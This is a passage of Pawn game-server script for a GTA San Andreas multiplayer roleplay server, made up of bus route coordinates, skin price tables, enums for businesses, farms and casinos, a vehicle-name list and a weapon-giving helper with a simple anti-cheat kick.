	{-1819.7305,-2604.8577,55.3396, -1650.0139,-2729.6946,47.0341},
	{-1650.0139,-2729.6946,47.0341, -1475.8119,-2892.1995,47.0225},
	{-1475.8119,-2892.1995,47.0225, -1371.2446,-2927.9302,47.4409},
	{-1371.2446,-2927.9302,47.4409, -947.9971,-2869.8306,66.7587},
	{-947.9971,-2869.8306,66.7587, -707.9083,-2788.6650,51.9978},
	{-707.9083,-2788.6650,51.9978, -194.1682,-2871.2712,39.2822},
	{-194.1682,-2871.2712,39.2822, -1.8479,-2756.8240,40.6794},
	{-1.8479,-2756.8240,40.6794, -86.2643,-2462.9468,33.8937},
	{-86.2643,-2462.9468,33.8937, -188.5853,-2350.8984,29.3682},
	{-188.5853,-2350.8984,29.3682, -327.8987,-2072.2246,27.2352},
	{-327.8987,-2072.2246,27.2352, -239.0778,-1609.7271,15.6402},
	{-239.0778,-1609.7271,15.6402, -62.5916,-1412.4728,12.0027},
	{-62.5916,-1412.4728,12.0027, 90.8736,-1287.7268,13.8016},
	{90.8736,-1287.7268,13.8016, 415.2348,-1142.6877,30.3734},
	{415.2348,-1142.6877,30.3734, 620.9048,-1231.2452,18.1559},
	{620.9048,-1231.2452,18.1559, 649.9189,-1396.6401,13.5180},
	{649.9189,-1396.6401,13.5180, 1315.4454,-1404.1787,13.3932},
	{1315.4454,-1404.1787,13.3932, 1336.8890,-1457.1638,13.4858},
	{1336.8890,-1457.1638,13.4858, 1300.9177,-1541.2573,13.4843},
	{1300.9177,-1541.2573,13.4843, 1296.1965,-1821.1320,13.4835},
	{1296.1965,-1821.1320,13.4835, 1209.7904,-1851.5548,13.4835},
	{1209.7904,-1851.5548,13.4835, 1183.1213,-1777.6486,13.4988},
	{1183.1213,-1777.6486,13.4988, 1182.4337,-1733.9489,13.5076},
	{1182.4337,-1733.9489,13.5076, 1163.9393,-1713.9647,13.8430}, //////////////////
	{1163.9393,-1713.9647,13.8430, 1056.2832,-1712.1915,13.4836},
	{1056.2832,-1712.1915,13.4836, 1040.4452,-1567.7225,13.4811},
	{1040.4452,-1567.7225,13.4811, 1061.6090,-1432.1150,13.4626},
	{1061.6090,-1432.1150,13.4626, 1354.4844,-1406.0000,13.4208},
	{1354.4844,-1406.0000,13.4208, 1395.0216,-1428.9286,13.4851},
	{1395.0216,-1428.9286,13.4851, 1432.8265,-1443.9072,13.4855},
	{1432.8265,-1443.9072,13.4855, 1457.6628,-1196.4583,19.8684},
	{1457.6628,-1196.4583,19.8684, 1613.9203,-1163.7047,23.9937},
	{1613.9203,-1163.7047,23.9937, 1640.3938,-1126.9946,24.0055}
};

new Float:BusLSZavodi[][] = {
	{1626.6134,-1157.9778,23.9838, 1438.9491,-1158.1682,23.7565},
	{1438.9491,-1158.1682,23.7565, 1371.1659,-1141.6920,23.7575},
	{1371.1659,-1141.6920,23.7575, 1156.3663,-1142.7145,23.7581},
	{1156.3663,-1142.7145,23.7581, 1060.3214,-1161.7843,23.8253},
	{1060.3214,-1161.7843,23.8253, 1057.4797,-1369.3597,13.4901},
	{1057.4797,-1369.3597,13.4901, 1059.5537,-1415.6218,13.4781},
	{1059.5537,-1415.6218,13.4781, 1047.9326,-1496.2870,13.4866},
	{1047.9326,-1496.2870,13.4866, 1036.2673,-1656.0790,13.4838},
	{1036.2673,-1656.0790,13.4838, 1049.6667,-1711.8562,13.4826},
	{1049.6667,-1711.8562,13.4826, 1130.1522,-1713.4314,13.5866}, /////////////////
	{1130.1522,-1713.4314,13.5866, 1265.5109,-1713.5775,13.4836},
	{1265.5109,-1713.5775,13.4836, 1294.7024,-1724.8502,13.5243},
	{1294.7024,-1724.8502,13.5243, 1309.5178,-1833.7739,13.4840},
	{1309.5178,-1833.7739,13.4840, 1312.6914,-1663.8285,13.4837},
	{1312.6914,-1663.8285,13.4837, 1315.0392,-1560.2806,13.4898},
	{1315.0392,-1560.2806,13.4898, 1340.8297,-1494.3445,13.4874},
	{1340.8297,-1494.3445,13.4874, 1360.3828,-1125.4598,23.7805},
	{1360.3828,-1125.4598,23.7805, 1395.3101,-948.5587,34.7014},
	{1395.3101,-948.5587,34.7014, 1534.1229,-993.1343,42.2408},
	{1534.1229,-993.1343,42.2408, 1706.8365,-765.2202,52.9134},
	{1706.8365,-765.2202,52.9134, 1696.4478,-428.3773,34.2487},
	{1696.4478,-428.3773,34.2487, 1671.1747,-91.4483,35.7530},
	{1671.1747,-91.4483,35.7530, 1653.3126,243.5643,30.0597},
	{1653.3126,243.5643,30.0597, 1758.7390,552.5330,25.9447},
	{1758.7390,552.5330,25.9447, 1807.9695,812.0594,10.9973},
	{1807.9695,812.0594,10.9973, 1866.2555,831.4418,9.1772},
	{1866.2555,831.4418,9.1772, 2100.0452,832.0826,6.8356},
	{2100.0452,832.0826,6.8356, 2301.5449,835.6395,6.8435},
	{2301.5449,835.6395,6.8435, 2677.1301,963.5281,6.8355},
	{2677.1301,963.5281,6.8355, 2744.8875,1366.6559,6.8214},
	{2744.8875,1366.6559,6.8214, 2793.1299,1448.3379,10.7282},
	{2793.1299,1448.3379,10.7282, 2820.1904,1466.8337,10.8467},
	{2820.1904,1466.8337,10.8467, 2820.9973,1359.1929,10.8510},
	{2820.9973,1359.1929,10.8510, 2764.8262,1254.7311,10.8544},
	{2764.8262,1254.7311,10.8544, 2782.9355,1229.9468,10.8570},
	{2782.9355,1229.9468,10.8570, 2829.0437,1282.5835,10.8818},
	{2829.0437,1282.5835,10.8818, 2827.6799,1451.7260,10.8118},
	{2827.6799,1451.7260,10.8118, 2658.8022,1473.1030,10.9049},
	{2658.8022,1473.1030,10.9049, 2639.7986,1452.9443,10.7581},
	{2639.7986,1452.9443,10.7581, 2696.7070,1343.2480,6.8374},
	{2696.7070,1343.2480,6.8374, 2704.1851,1106.0325,6.8354},
	{2704.1851,1106.0325,6.8354, 2655.3137,966.9592,6.8367},
	{2655.3137,966.9592,6.8367, 2604.7678,911.7582,6.8396},
	{2604.7678,911.7582,6.8396, 2474.0730,859.2693,6.8459},
	{2474.0730,859.2693,6.8459, 1949.6083,851.5674,6.8313},
	{1949.6083,851.5674,6.8313, 1787.6935,806.8473,11.1060},
	{1787.6935,806.8473,11.1060, 1634.2479,226.0851,30.7790}, //////////////////
	{1634.2479,226.0851,30.7790, 1610.2744,124.0676,36.9908},
	{1610.2744,124.0676,36.9908, 1640.1609,-38.5060,36.6895},
	{1640.1609,-38.5060,36.6895, 1664.2051,-340.3452,40.3461},
	{1664.2051,-340.3452,40.3461, 1703.0380,-593.9151,38.1101},
	{1703.0380,-593.9151,38.1101, 1673.0964,-781.1240,54.6800},
	{1673.0964,-781.1240,54.6800, 1427.4979,-941.3197,36.2182},
	{1427.4979,-941.3197,36.2182, 1363.2279,-959.3282,34.0392},
	{1363.2279,-959.3282,34.0392, 1350.8372,-1053.6084,26.7221},
	{1350.8372,-1053.6084,26.7221, 1340.8602,-1427.0399,13.4789},
	{1340.8602,-1427.0399,13.4789, 1316.3042,-1505.8967,13.4840},
	{1316.3042,-1505.8967,13.4840, 1296.3157,-1679.8788,13.4839},
	{1296.3157,-1679.8788,13.4839, 1286.2415,-1711.3412,13.4832},
	{1286.2415,-1711.3412,13.4832, 1128.2864,-1709.4812,13.5523},
	{1128.2864,-1709.4812,13.5523, 1056.2510,-1710.3544,13.4836},
	{1056.2510,-1710.3544,13.4836, 1040.9821,-1555.0303,13.4632},
	{1040.9821,-1555.0303,13.4632, 1058.4032,-1474.1971,13.4791},
	{1058.4032,-1474.1971,13.4791, 1060.8860,-1395.2904,13.5821},
	{1060.8860,-1395.2904,13.5821, 1059.6604,-1175.7849,23.1790},
	{1059.6604,-1175.7849,23.1790, 1079.6471,-1151.8898,23.7576},
	{1079.6471,-1151.8898,23.7576, 1362.8177,-1143.9968,23.7570},
	{1362.8177,-1143.9968,23.7570, 1405.0570,-1152.2969,23.7612},
	{1405.0570,-1152.2969,23.7612, 1622.4208,-1162.8495,23.9980},
	{1622.4208,-1162.8495,23.9980, 1641.7179,-1125.3340,24.0071},
	{1641.7179,-1125.3340,24.0071, 1626.6134,-1157.9778,23.9838}
};

new Float:BusLSLV[][] = {
	{1626.6134,-1157.9778,23.9838, 1438.9491,-1158.1682,23.7565},
	{1438.9491,-1158.1682,23.7565, 1371.1659,-1141.6920,23.7575},
	{1371.1659,-1141.6920,23.7575, 1156.3663,-1142.7145,23.7581},
	{1156.3663,-1142.7145,23.7581, 1060.3214,-1161.7843,23.8253},
	{1060.3214,-1161.7843,23.8253, 1057.4797,-1369.3597,13.4901},
	{1057.4797,-1369.3597,13.4901, 1059.5537,-1415.6218,13.4781},
	{1059.5537,-1415.6218,13.4781, 1047.9326,-1496.2870,13.4866},
	{1047.9326,-1496.2870,13.4866, 1036.2673,-1656.0790,13.4838},
	{1036.2673,-1656.0790,13.4838, 1049.6667,-1711.8562,13.4826},
	{1049.6667,-1711.8562,13.4826, 1130.1522,-1713.4314,13.5866}, /////////////////
	{1130.1522,-1713.4314,13.5866, 1265.5109,-1713.5775,13.4836},
	{1265.5109,-1713.5775,13.4836, 1294.7024,-1724.8502,13.5243},
	{1294.7024,-1724.8502,13.5243, 1309.5178,-1833.7739,13.4840},
	{1309.5178,-1833.7739,13.4840, 1312.6914,-1663.8285,13.4837},
	{1312.6914,-1663.8285,13.4837, 1315.0392,-1560.2806,13.4898},
	{1315.0392,-1560.2806,13.4898, 1340.8297,-1494.3445,13.4874},
	{1340.8297,-1494.3445,13.4874, 1360.3828,-1125.4598,23.7805},
	{1360.3828,-1125.4598,23.7805, 1395.3101,-948.5587,34.7014},
	{1395.3101,-948.5587,34.7014, 1534.1229,-993.1343,42.2408},
	{1534.1229,-993.1343,42.2408, 1706.8365,-765.2202,52.9134},
	{1706.8365,-765.2202,52.9134, 1696.4478,-428.3773,34.2487},
	{1696.4478,-428.3773,34.2487, 1671.1747,-91.4483,35.7530},
	{1671.1747,-91.4483,35.7530, 1653.3126,243.5643,30.0597},
	{1653.3126,243.5643,30.0597, 1758.7390,552.5330,25.9447},
	{1758.7390,552.5330,25.9447, 1807.9695,812.0594,10.9973},
	{1807.9695,812.0594,10.9973, 1866.2555,831.4418,9.1772},
	{1866.2555,831.4418,9.1772, 2100.0452,832.0826,6.8356},
	{2100.0452,832.0826,6.8356, 2301.5449,835.6395,6.8435},
	{2301.5449,835.6395,6.8435, 2677.1301,963.5281,6.8355},
	{2677.1301,963.5281,6.8355, 2744.8875,1366.6559,6.8214},
	{2744.8875,1366.6559,6.8214, 2793.1299,1448.3379,10.7282},
	{2793.1299,1448.3379,10.7282, 2820.1904,1466.8337,10.8467},
	{2820.1904,1466.8337,10.8467, 2820.9973,1359.1929,10.8510},
	{2820.9973,1359.1929,10.8510, 2764.8262,1254.7311,10.8544},
	{2764.8262,1254.7311,10.8544, 2782.9355,1229.9468,10.8570},
	{2782.9355,1229.9468,10.8570, 2829.0437,1282.5835,10.8818},
	{2829.0437,1282.5835,10.8818, 2827.6799,1451.7260,10.8118},
	{2827.6799,1451.7260,10.8118, 2658.8022,1473.1030,10.9049},
	{2658.8022,1473.1030,10.9049, 2639.7986,1452.9443,10.7581},
	{2639.7986,1452.9443,10.7581, 2696.7070,1343.2480,6.8374},
	{2696.7070,1343.2480,6.8374, 2704.1851,1106.0325,6.8354},
	{2704.1851,1106.0325,6.8354, 2655.3137,966.9592,6.8367},
	{2655.3137,966.9592,6.8367, 2604.7678,911.7582,6.8396},
	{2604.7678,911.7582,6.8396, 2474.0730,859.2693,6.8459},
	{2474.0730,859.2693,6.8459, 1949.6083,851.5674,6.8313},
	{1949.6083,851.5674,6.8313, 1787.6935,806.8473,11.1060},
	{1787.6935,806.8473,11.1060, 1634.2479,226.0851,30.7790}, //////////////////
	{1634.2479,226.0851,30.7790, 1610.2744,124.0676,36.9908},
	{1610.2744,124.0676,36.9908, 1640.1609,-38.5060,36.6895},
	{1640.1609,-38.5060,36.6895, 1664.2051,-340.3452,40.3461},
	{1664.2051,-340.3452,40.3461, 1703.0380,-593.9151,38.1101},
	{1703.0380,-593.9151,38.1101, 1673.0964,-781.1240,54.6800},
	{1673.0964,-781.1240,54.6800, 1427.4979,-941.3197,36.2182},
	{1427.4979,-941.3197,36.2182, 1363.2279,-959.3282,34.0392},
	{1363.2279,-959.3282,34.0392, 1350.8372,-1053.6084,26.7221},
	{1350.8372,-1053.6084,26.7221, 1340.8602,-1427.0399,13.4789},
	{1340.8602,-1427.0399,13.4789, 1316.3042,-1505.8967,13.4840},
	{1316.3042,-1505.8967,13.4840, 1296.3157,-1679.8788,13.4839},
	{1296.3157,-1679.8788,13.4839, 1286.2415,-1711.3412,13.4832},
	{1286.2415,-1711.3412,13.4832, 1128.2864,-1709.4812,13.5523},
	{1128.2864,-1709.4812,13.5523, 1056.2510,-1710.3544,13.4836},
	{1056.2510,-1710.3544,13.4836, 1040.9821,-1555.0303,13.4632},
	{1040.9821,-1555.0303,13.4632, 1058.4032,-1474.1971,13.4791},
	{1058.4032,-1474.1971,13.4791, 1060.8860,-1395.2904,13.5821},
	{1060.8860,-1395.2904,13.5821, 1059.6604,-1175.7849,23.1790},
	{1059.6604,-1175.7849,23.1790, 1079.6471,-1151.8898,23.7576},
	{1079.6471,-1151.8898,23.7576, 1362.8177,-1143.9968,23.7570},
	{1362.8177,-1143.9968,23.7570, 1405.0570,-1152.2969,23.7612},
	{1405.0570,-1152.2969,23.7612, 1622.4208,-1162.8495,23.9980},
	{1622.4208,-1162.8495,23.9980, 1641.7179,-1125.3340,24.0071},
	{1641.7179,-1125.3340,24.0071, 1626.6134,-1157.9778,23.9838}
};

//////////////////////////////

new lift;
new kolvovsklade;
new kolvovfure;
new kauta;
new Text3D:LvaLable;
new kauta2;
new skladfbi;
new skladfbi2;
new nikname;
new nikname2;
new cerkva;
new cerkva2;
new lift2;
new SDuty[MAX_PLAYERS];
new lift3;
new lift4;
new lift5;
new ChatOOC[MAX_PLAYERS];
new lift6;
new ash;
new ash2;
new maria;
new mariaexit;
new rmspawn[2];
new lcnspawn[2];

new paints[3];
new paintguns[4];

new SlotAttach[51];
new SlotObject[250];
new SlotActor[50];
new vidachagun[12][MAX_PLAYERS];
new string[1000];
new YCMDstr[256];
new PlayerText:FULLRECON[MAX_PLAYERS];
new ChosenPlayer[MAX_PLAYERS];
new PickupRazd[32];
new strR[255][255];
enum skin_Info
{
	SkinName
}
new SkinMen[][2] =
{
	{66,1000},
	{15,1000},
	{36,1000},
	{50,1000},
	{95,1000},
	{96,1000},
	{136,1000},
	{143,1000},
	{155,1000},
	{2,50000},
	{14,50000},
	{24,50000},
	{58,100000},
	{7,300000},
	{23,300000},
	{33,300000},
	{60,500000},
	{67,500000},
	{73,500000},
	{184,500000},
	{21,700000},
	{22,700000},
	{30,700000},
	{183,700000},
	{255,700000},
	{4,700000},
	{6,700000},
	{8,700000},
	{42,700000},
	{273,700000},
	{17,1000000},
	{45,1000000},
	{82,1000000},
	{83,1000000},
	{185,1000000},
	{290,1000000},
	{291,1000000},
	{28,1200000},
	{29,1200000},
	{248,1200000},
	{247,1200000},
	{254,1200000},
	{249,1200000},
	{18,1500000},
	{19,1500000},
	{47,1500000},
	{48,1500000},
	{101,1500000},
	{299,1500000},
	{289,1500000},
	{61,2000000},
	{121,2000000},
	{227,2000000},
	{228,2000000},
	{292,2000000},
	{293,2000000},
	{297,2000000},
	{122,2500000},
	{111,3000000},
	{117,3500000},
	{118,3500000},
	{126,4000000},
	{127,4000000},
	{296,4000000},
	{3,4000000},
	{119,4000000},
	{208,4000000},
	{295,4500000},
	{46,5000000},
	{294,5000000}
};
new SkinMale[][2] ={
	{65, 1000},
	{192, 10000},
	{219, 1000000},
	{93, 2000000},
	{211, 2000000},
	{233, 2000000},
	{148, 3000000},
	{169, 4000000},
	{141, 5000000},
	{76, 5000000},
	{150, 5000000},
	{214, 5000000}
};
new TotalHouse = 0;
new TotalBizz = 0;
new ChangeSkin[MAX_PLAYERS];
new HealthOn[MAX_PLAYERS];
new vehcreat[MAX_VEHICLES];
new radioall;
new Float:PickupX[MAX_PLAYERS],Float:PickupY[MAX_PLAYERS];
new oldpickup[MAX_PLAYERS];
new timepickup[MAX_PLAYERS];
// WareLock
new bool:wareAztecLock = false;
new bool:wareGrooveLock = false;
new bool:wareBallasLock = false;
new bool:wareRifaLock = false;
new bool:wareVagosLock = false;
new bool:wareLcnLock = false;
new bool:wareYakuzaLock = false;
new bool:wareRmLock = false;
new bool:wareHAMLock = false;
new bool:warePMCLock = false;
new bool:wareWCMLock = false;
new AdvertTime;
new Weapons[MAX_PLAYERS][47];
stock GiveWeapon(playerid,weaponid,ammo)
{
	SetPVarInt(playerid, "GunCheckTime", 2);
	new ammow = 0;
	switch(weaponid)
	{
	case 1..9: GetPlayerWeaponData(playerid, 1, ammow, ammow);
	case 10..15: GetPlayerWeaponData(playerid, 10, ammow, ammow);
	case 16..19: GetPlayerWeaponData(playerid, 8, ammow, ammow);
	case 22..24: GetPlayerWeaponData(playerid, 2, ammow, ammow);
	case 25..27: GetPlayerWeaponData(playerid, 3, ammow, ammow);
	case 28..29,32: GetPlayerWeaponData(playerid, 4, ammow, ammow);
	case 30..31: GetPlayerWeaponData(playerid, 5, ammow, ammow);
	case 33..34: GetPlayerWeaponData(playerid, 6, ammow, ammow);
	case 35..38: GetPlayerWeaponData(playerid, 7, ammow, ammow);
	case 41..43: GetPlayerWeaponData(playerid, 9, ammow, ammow);
	}
	Weapons[playerid][weaponid] += (ammo+ammow);
	GivePlayerWeapon(playerid,weaponid,ammo);
	if(weaponid == 17 && ammo == 17)
	{
	    SCM(playerid, COLOR_LIGHTRED, " Вы были кикнуты по подозрению в читерстве! (#002)");
        Kick(playerid);
	}
	return true;
}
new TOTALADVERT[3];
new rob;
new ReportQ[MAX_PLAYERS][144];
enum adInfo
{
	adPhone,
	adText[128],
	adName[50],
	bool:edited,
	editName[50]
};
new AdvertInfo[30][3][adInfo];
enum vibrosilInfo
{
	vModel,
	vTime,
Float:vX,
Float:vY,
Float:vZ,
Text3D:vPodnyat,
	vKol,
	vObject
};
new VibrosInfo[999][vibrosilInfo], SLOTVIBROS = 0;
enum atm
{
	aid,
Float:aX,
Float:aY,
Float:aZ,
Float:arZ
};
new ATMInfo[100][atm], TOTALATM = 0;
new ATM[100], ATMADVERTISE[20][150];
new Text3D:LABELATM[100];
enum wInfo
{
	wID,
	wOwner[MAX_PLAYER_NAME],
Float:wEntr[3],
Float:wExit[3],
Float:wMenu[3],
	wBank,
	wLandTax,
	wProds,
	wPriceProds,
	wZp,
	wDeputy1[32],
	wDeputy2[32],
	wDeputy3[32],
	wMechanic1[32],
	wMechanic2[32],
	wMechanic3[32],
	wMechanic4[32],
	wMechanic5[32],
	wAuction[5],
	wAuctions[128],
	wAuctionName[MAX_PLAYER_NAME],
Text3D:wLabel,
	wPickup[4],
	wBiker,
bool:isCaptured,
};
new WorkshopInfo[5][wInfo], TOTALSHOPS = 0;
// Развозчики продуктов на ферму
new car_grain[MAX_VEHICLES][3];
new car_prods[MAX_VEHICLES][4];
new car_pickup[MAX_VEHICLES];
new Text3D:car_text[MAX_VEHICLES];
//
enum fInfo
{
	fID,
	fOwner[MAX_PLAYER_NAME],
Float: fMenu[3],
Float: fCloakroom[3],
	fBank,
	fLandTax,
	fZp,
	fGrain_Price,
	fGrain,
	fGrain_Sown,
	fProds_Selling,
	fProds,
	fProds_Price,
	fDeputy_1[MAX_PLAYER_NAME],
	fDeputy_2[MAX_PLAYER_NAME],
	fDeputy_3[MAX_PLAYER_NAME],
	fFarmer_1[MAX_PLAYER_NAME],
	fFarmer_2[MAX_PLAYER_NAME],
	fFarmer_3[MAX_PLAYER_NAME],
	fFarmer_4[MAX_PLAYER_NAME],
	fFarmer_5[MAX_PLAYER_NAME],
	fAuction[5],
	fAuctions[64],
	fAuctionName[MAX_PLAYER_NAME],
Text3D:fLabel,
	fPickup[2],
	fSeed_Car[2],
	fCombine,
	fBiker,
bool:isCaptured,
};
new FarmInfo[6][fInfo], TOTALFARM = 0;
new Farmtimer[MAX_PLAYERS];
new bool:Farmcar_works[MAX_VEHICLES];
new Farmcar_pickup[MAX_VEHICLES];
new Text3D:Farmcar_text[MAX_VEHICLES];
new Farmcar_prods[MAX_VEHICLES];
new Float:Farmcombine_coord_one[16][3] = {
	{-320.8694,-1365.4385,9.8428},
	{-324.8013,-1401.0339,13.2010},
	{-301.7462,-1425.4576,13.9760},
	{-287.7421,-1391.3496,10.4911},
	{-284.4016,-1344.1929,7.2467},
	{-257.3175,-1316.2000,9.9445},
	{-245.2030,-1356.5045,8.7477},
	{-243.9296,-1388.2174,9.6420},
	{-228.3160,-1422.7065,5.0133},
	{-206.5894,-1394.1740,5.8277},
	{-204.5860,-1330.3910,9.8077},
	{-182.5080,-1311.5313,5.9209},
	{-180.3449,-1365.8169,3.8640},
	{-214.0825,-1415.8950,4.5256},
	{-264.4544,-1426.5730,9.1420},
	{-324.6056,-1428.9579,14.8003}
};
new Float:Farmcombine_coord_two[15][3] = {
	{-130.7027,44.7220,2.8443},
	{-145.5741,61.2925,2.8443},
	{-165.2465,43.3439,2.8443},
	{-175.8336,7.8020,2.8365},
	{-191.4658,-42.5760,2.8443},
	{-228.0420,-69.5110,2.8442},
	{-230.8085,-30.8695,2.8443},
	{-209.9449,29.5974,2.8443},
	{-208.8271,91.6010,2.5696},
	{-241.8963,57.9227,1.9067},
	{-257.0153,8.2201,1.9814},
	{-271.7077,-37.9002,2.1155},
	{-250.0249,-67.0826,2.8443},
	{-191.2002,-74.9127,2.8443},
	{-150.3399,-6.1474,2.8443}
};
new Float:Farmcombine_coord_three[15][3] = {
	{-1187.8000,-1051.3243,128.9458},
	{-1187.5616,-1020.7885,128.9458},
	{-1187.0750,-958.0953,128.9390},
	{-1157.4517,-927.2670,128.9458},
	{-1131.6406,-968.0543,128.9458},
	{-1132.7548,-1022.1390,128.9458},
	{-1094.4727,-1055.9808,128.9388},
	{-1070.3040,-1008.1692,128.9458},
	{-1069.8025,-946.7182,128.9458},
	{-1041.3453,-919.6816,128.9458},
	{-1020.2495,-958.0220,128.9458},
	{-1018.5430,-1018.1034,128.9397},
	{-1055.0632,-1054.2510,128.9390},
	{-1110.2307,-1055.0585,128.9465},
	{-1182.4001,-1058.6345,128.9458}
};
new Float:Farmcombine_coord_four[10][3] = {
	{-8.9009,-7.1966,2.8443},
	{-25.3066,-51.6468,2.8443},
	{-25.7014,-107.4654,2.8443},
	{-1.5358,-79.6419,2.8446},
	{21.8522,-43.6649,2.8443},
	{18.2182,-75.2312,1.8680},
	{24.0178,-112.9527,0.3364},
	{38.4268,-77.6550,0.4112},
	{20.3284,-42.6540,2.8424},
	{-7.0064,-7.9382,2.8443}
};
new Float:Farmcombine_coord_five[11][3] = {
	{1916.7062,194.0659,34.2542},
	{1917.7260,216.1904,29.9047},
	{1936.3885,233.2233,28.5738},
	{1942.2996,205.0887,31.2080},
	{1958.4962,183.6927,33.7993},
	{1970.1038,203.6444,29.6427},
	{1988.0249,228.8007,27.1248},
	{1999.4275,204.8942,26.9487},
	{1979.3251,179.1305,32.0967},
	{1933.9193,187.5078,34.8203},
	{1918.4210,191.2246,34.7327}
};
new Float:Farmcar_coord_one[4][3] = {
	{-305.3935,-1334.0796,8.2550},
	{-311.4154,-1359.4165,9.0605},
	{-256.1160,-1385.5819,10.0414},
	{-191.2922,-1380.0945,5.0030}
};
new Float:Farmcar_coord_two[4][3] = {
	{-167.5728,-4.7965,3.1172},
	{-194.6789,49.8787,3.1172},
	{-236.7553,-9.5347,3.1172},
	{-227.7488,-52.3213,3.1172}
};
new Float:Farmcar_coord_three[4][3] = {
	{-1183.0190,-1058.6979,129.1978},
	{-1154.6866,-1046.9103,129.2095},
	{-1075.6294,-930.5206,129.2089},
	{-1028.6787,-973.0988,129.2091}
};
new Float:Farmcar_coord_four[4][3] = {
	{-5.4270,-44.5476,2.8443},
	{-0.9173,-95.1931,2.3333},
	{37.3381,-77.9443,0.4641},
	{-22.6910,-59.8679,2.8443}
};
new Float:Farmcar_coord_five[4][3] = {
	{1921.2250,204.1377,32.3460},
	{1966.3246,198.3651,31.0604},
	{1985.4440,183.7903,31.270},
	{1993.8384,224.2885,27.1094}
};
enum stallInfo
{
	stID,
Float:stPos[4],
Text3D:stText
}
new StallInfo[50][stallInfo], TOTALSTALL = 0;
enum caInfo
{
	caID,
	caName[64],
	caMafia,
	caManager[32],
	caManager2[32],
	caManager3[32],
	caKrupie[32],
	caKrupie2[32],
	caKrupie3[32],
	caKrupie4[32],
	caKrupie5[32],
	caKrupie6[32],
	caKrupie7[32],
	caKrupie8[32],
	caKrupie9[32],
	caKrupie10[32],
Float:caPos[3],
}
new CasinoInfo[3][caInfo], TOTALCASINO = 0;
new FormaFracPic[16];
new freshtimer;
new war = 0;
new rabota1;
new IPMSG[5][] = {
	{"IP проверка обезопасит Ваш аккаунт от взлома!\n"},
	{"Если Ваш IP адрес будет изменён, система потребуют ключ безопасности\n\n"},
	{"Для того чтобы включить/отключить защиту \n"},
	{"Введите /mm - [10] Безопасность\n\n"},
	{"Обязательно установите ключ безопасности!\n"}
};
new tpadminhome[2];
new parashut;
new dinamicashs[MAX_PLAYERS];
new modernhouse[17];
new bool:modern = false;
new licgate;
new gruzgate;
new bool:Prorab[MAX_PLAYERS];
new caligula[3];
new dragons[2];
new wmcvhod;
new wmcvqhod;
new pmcvhod;
new pmcvqhod;
new vmcvhod;
new vmcvqhod;
new Text3D:GasZavod[2];
new Text3D:Doki[2];
new Text3D:Sklad[2];
new Text3D:Derevobuy[2];
new PetrolTanker[6];
new Linerunner[2];
new Tanker[12];
new Roadtrain[6];
new bGruz[MAX_PLAYERS];
new levelDexp = 20000;
new Gruz[MAX_PLAYERS];
new Benzbuy[2] = {500,500};
new ugolbuy[2] = {500,500};
new Buyderevo[2] = {500,500};
new Sellugol[2] = {800,800};
new Sellderevo[2] = {800,800};
new Sellbenz[2] = {800,800};
new bool:DriverJob[MAX_PLAYERS];
new bool:jobcar[MAX_VEHICLES];
new Tune[MAX_PLAYERS];
new MehJob[MAX_PLAYERS];
new sellzone[MAX_PLAYERS];
new mesh[MAX_PLAYERS];
new usemesh[MAX_PLAYERS];
new play[MAX_PLAYERS];
new PText[MAX_PLAYERS][128];
new timer2[MAX_PLAYERS];
new Flood[MAX_PLAYERS];
new seans[MAX_PLAYERS];
new taxiexpp[MAX_PLAYERS];
new medicss[10];
new ProposeOffer[MAX_PLAYERS];
new Krisha[MAX_PLAYERS];
new KrishaOffer[MAX_PLAYERS];
new ProposedTo[MAX_PLAYERS];
new GotProposedBy[MAX_PLAYERS];
new chekmatlva[10];
new chekmats[2];
new tex[MAX_PLAYERS];
new tex2[MAX_PLAYERS];
new addd[3];
new TicketOffer[MAX_PLAYERS];
new TicketMoney[MAX_PLAYERS];
new enterbiz[MAX_PLAYERS];
new Hptimer;
new gSpectateID[MAX_PLAYERS];
new zvonok[3] = {-1, -1, -1};
new PlayerDrunk[MAX_PLAYERS];
new mast[3];
new startaddiction[MAX_PLAYERS];
new chet[MAX_PLAYERS];
new arace;
new PicCP[MAX_PLAYERS];
new Text:DRAP;
new createdvehs;
new house_car[MAX_PLAYERS];
new createdcar;
new creatcar[MAX_PLAYERS];
enum admveh
{
	createdveh,
	vehid,
	color1,
	color2
};
new AdminVehicle[MAX_PLAYERS][admveh];
new carpick[4];
new VehicleNames[212][] = {
	"Landstalker","Bravura","Buffalo","Linerunner","Perrenial","Sentinel","Dumper","Firetruck","Trashmaster","Stretch","Manana","Infernus",
	"Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto","Taxi","Washington","Bobcat","Mr.Whoopee","BF Injection",
	"Hunter","Premier","Enforcer","Securicar","Banshee","Predator","Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie",
	"Stallion","Rumpo","RC Bandit","Romero","Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer","Turismo","Speeder",
	"Reefer","Tropic","Flatbed","Yankee","Caddy","Solair","Berkley's RC Van","Skimmer","PCJ-600","Faggio","Freeway","RC Barron","RC Raider",
	"Glendale","Oceanic","Sanchez","Sparrow","Patriot","Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler","Zr-350","Walton","Regina",
	"Comet","BMX","Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper","Rancher","FBI Rancher","Virgo","Greenwood",
	"Jetmax","Hotring","Sandking","Blista Compact","Police Maverick","Boxville","Benson","Mesa","RC Goblin","Hotring A","Hotring B",
	"Bloodring Banger","Rancher","Super GT","Elegant","Journey","Bike","Mountain Bike","Beagle","Cropdust","Stunt","Tanker","Roadtrain",
	"Nebula","Majestic","Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV1000","Cement Truck","Tow Truck","Fortune","Cadrona","FBI Truck",
	"Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight","Streak","Vortex","Vincent","Bullet","Clover",
	"Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob","Tampa","Sunrise","Merit","Utility","Nevada","Yosemite","Windsor","Monster A",
	"Monster B","Uranus","Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger","Flash","Tahoma","Savanna","Bandito","Freight","Trailer",
	"Kart","Mower","Duneride","Sweeper","Broadway","Tornado","AT-400","DFT-30","Huntley","Stafford","BF-400","Newsvan","Tug","Trailer A","Emperor",
	"Wayfarer","Euros","Hotdog","Club","Trailer B","Trailer C","Andromada","Dodo","RC Cam","Launch","Police Car","Police Car",
	"Police Car","Police Ranger","Picador","S.W.A.T.","Alpha","Phoenix","Glendale","Sadler","L Trailer A","L Trailer B",
